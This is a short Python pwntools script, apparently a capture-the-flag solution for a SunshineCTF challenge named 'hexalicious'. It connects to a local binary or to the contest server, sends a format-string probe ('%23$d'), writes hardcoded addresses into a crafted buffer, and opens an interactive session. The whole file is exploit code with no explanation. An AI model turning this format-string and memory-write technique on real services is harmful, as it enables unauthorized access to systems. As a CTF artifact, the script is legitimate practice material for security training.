#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./hexalicious"
elf=ELF(pwn_file)

if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn=remote("chal1.sunshinectf.org",20003)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()


conn.sendlineafter("Hello random stranger, what shall I call you?","%23$d")

conn.sendlineafter("[>] ","0")
debug()
f={
    0:str(0x804b0b0),
    0x20:p32(0x804B0E4),
}

conn.sendline(fit(f,filler="\x00"))

conn.interactive()
